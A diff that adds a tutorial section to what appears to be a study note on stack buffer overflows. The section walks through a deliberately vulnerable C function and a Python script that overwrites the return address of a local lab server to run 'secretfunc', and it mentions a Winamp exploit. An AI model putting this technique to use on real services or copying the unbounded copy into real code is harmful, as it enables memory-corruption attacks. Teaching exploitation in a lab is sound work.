@@ -111,6 +111,84 @@ The `RET` instruction pops the last value off the stack, which supposed to be th
 
 
 
+# Overwriting the return address (contrived example)
+
+To help drive the buffer overrun home with a working sample. As highlighted, when procedure is called its prolog saves the return address and creates a new stack frame. The return address allows control flow to resume where it left off, once the procedure call is complete. It is this very control flow that a buffer overrun exploits.
+
+*Setup*:
+
+To add x86 architecture support to kali:
+
+    dpkg --add-architecture i386
+
+Then to get a working development environment, for hacking on these x86 samples:
+
+    apt update
+    apt install libc-dev-i386-cross gdb-multiarch execstack gdb-peda lib32tinfo6 lib32ncurses6 lib32ncurses-dev gcc-7
+
+
+ First a piece of vulnerable code:
+
+    void overflowme(char *str) {
+        char buf[4] = {0};
+        strcopy(buf, str);
+    }
+    
+    void secretfunc(void) {
+        puts("You win!!!!!!!!!!!!!!!!!!\n");
+    }
+    
+    void strcopy(char* dst, char* src) {
+        while ((*dst++ = *src++));
+    }
+
+The main function calls `overflowme`, but the objective here is to make the program execute `secretfunc`, which it currently does not. To achieve this, the exact memory address of `secretfunc` as it exists in the address space of the running program is needed. To keep this first example simple, the address is output:
+
+    printf("[+] secretfunc is @ %p\n", (void*)secretfunc);
+
+Which dumps out something like this:
+
+    [+] secretfunc is @ 0x804975a                                                                                                                                                                                   
+`overflowme` contains a 4 byte buffer. To get the program to run `secretfunc`, seems like just a matter of filling the buffer up with a large number of bytes that match the address of `secretfunc` (0x804975a). Some Python that will interact with the vulnerable server process - to start let try and flood the 4-byte buffer with 12 bytes:
+
+```python
+#!/usr/bin/env python
+
+import socket
+import struct
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("localhost", 8888))
+#buf="A" * 8
+buf = struct.pack('<I', 0x804975a) * 12
+print("Sending shellcode (" + str(len(buf)) + " bytes)")
+s.send(buf)
+```
+
+Start the vulnerable C server process:
+
+    # ./bin/server
+    [+] Server is starting...
+    [+] Server is now listening on 8888
+    [+] secretfunc is @ 0x804975a
+    [+] Awaiting clients...
+
+And run the python exploit:
+
+      [+] (Client 4) Connected
+    Printing:You are client 4
+      [+] (Client 4) Sent us 48 bytes
+      [+] (Client 4) Sent us ''
+    You win!!!!!!!!!!!!!!!!!!
+    You win!!!!!!!!!!!!!!!!!!
+    ...
+    Illegal instruction
+
+We can see the `secretfunc` was executed several times, before the program crashed.
+
+
+
+
 # Windows Example - Winamp 5.572 on XP
 
 As documented on [exploit-db](https://www.exploit-db.com/exploits/11256) this old version of winamp had a buffer overflow vulnerability in part of its help menu, which loads its release notes from a plain text file called `whatsnew.txt` in its install path.
